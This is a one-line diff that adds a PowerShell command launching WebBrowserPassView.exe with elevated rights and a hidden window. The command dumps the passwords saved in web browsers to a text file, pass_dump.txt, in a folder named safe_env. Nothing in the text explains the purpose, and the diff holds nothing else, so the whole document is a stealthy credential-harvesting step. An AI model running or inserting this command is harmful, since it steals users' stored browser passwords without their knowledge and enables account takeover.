@@ -1,0 +1,1 @@
+Start-Process -FilePath "$env:USERPROFILE\Documents\safe_env\WebBrowserPassView.exe" -Verb RunAs -ArgumentList "/stext", "`"$env:USERPROFILE\Documents\safe_env\pass_dump.txt`"" -Wait -WindowStyle Hidden
